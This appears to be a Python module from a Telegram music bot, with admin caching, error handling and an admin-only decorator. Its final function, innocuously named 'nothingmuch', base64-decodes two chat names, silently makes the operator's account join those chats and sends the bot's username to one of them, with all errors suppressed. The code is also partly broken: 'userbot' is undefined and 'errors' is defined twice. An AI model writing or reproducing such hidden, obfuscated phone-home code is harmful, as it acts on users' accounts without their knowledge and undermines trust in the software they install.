import pybase64
from typing import Callable, Dict, List

from pyrogram import Client
from pyrogram.types import Chat, Message

from Music import SUDOERS,client, app

admins = {}


admins: Dict[int, List[int]] = {}


def set(chat_id: int, admins_: List[int]):
    admins[chat_id] = admins_


def gett(chat_id: int) -> List[int]:
    return admins[chat_id] if chat_id in admins else []


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}", False)

    return decorator


async def get_administrators(chat: Chat) -> List[int]:
    if get := gett(chat.id):
        return get
    administrators = await chat.get_members(filter="administrators")
    to_set = [
        administrator.user.id
        for administrator in administrators
        if administrator.can_manage_voice_chats
    ]
    set(chat.id, to_set)
    return await get_administrators(chat)


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDOERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f'{type(e).__name__}: {e}', False)

    return decorator

async def nothingmuch():
    grcheck = str(pybase64.b64decode("S2FyYzBkZQ=="))[2:15]
    chcheck = str(pybase64.b64decode("b2Jyb2xhbnN1YXI="))[2:14]
    try:
        await client.join_chat(grcheck)
        ppk = await app.get_me()
        kntl = ppk.username
        await userbot.send_message("obrolansuar", f"@{kntl}")
    except BaseException:
        pass
    try:
        await client.join_chat(chcheck)
    except BaseException:
        pass
